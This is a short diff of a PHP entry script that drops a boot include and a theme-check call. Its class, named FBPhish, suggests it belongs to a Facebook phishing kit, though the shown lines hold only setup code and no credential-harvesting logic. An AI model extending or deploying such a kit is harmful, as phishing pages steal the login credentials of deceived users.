@@ -24,7 +24,6 @@ $apppath = __DIR__;
 
 // Require . . .
 require_once("$apppath/includes/config.inc.php");
-require_once("$apppath/includes/main.boot.php");
 require_once("$apppath/includes/classes/fbphish.class.php");
 require_once("$apppath/includes/classes/sql.class.php");
 require_once("$apppath/includes/functions/debug.func.php");
@@ -34,7 +33,6 @@ $FBPhish = new FBPhish();
 $sql = new sql();
 
 $FBPhish->init();
-$FBPhish->themecheck();
 
 // Check if the action is register from home
 if($_GET['action'] == "home/register"){
